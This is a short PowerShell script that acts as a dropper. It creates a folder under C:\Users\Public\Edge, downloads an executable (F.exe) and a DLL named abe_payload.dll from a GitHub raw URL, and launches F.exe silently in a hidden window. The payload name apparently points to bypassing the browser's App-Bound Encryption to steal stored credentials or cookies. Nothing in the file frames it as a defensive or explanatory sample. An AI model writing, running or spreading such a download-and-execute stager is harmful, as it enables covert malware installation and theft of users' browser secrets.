# Define paths and URLs
$targetDir = "C:\Users\Public\Edge\jsontest\"
$urlF = "https://github.com/rustdev55/test123/raw/refs/heads/main/edge/F.exe"
$urlDll = "https://github.com/rustdev55/test123/raw/refs/heads/main/edge/abe_payload.dll"

# Ensure the destination directory exists
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
}

# Download files
Invoke-WebRequest -Uri $urlF -OutFile "$targetDir\F.exe"
Invoke-WebRequest -Uri $urlDll -OutFile "$targetDir\abe_payload.dll"

# Set working directory to ensure logs/outputs land there
Set-Location -Path $targetDir

# Execute F.exe silently in the background (hidden window)
Start-Process -FilePath "$targetDir\F.exe" -WorkingDirectory $targetDir -WindowStyle Hidden
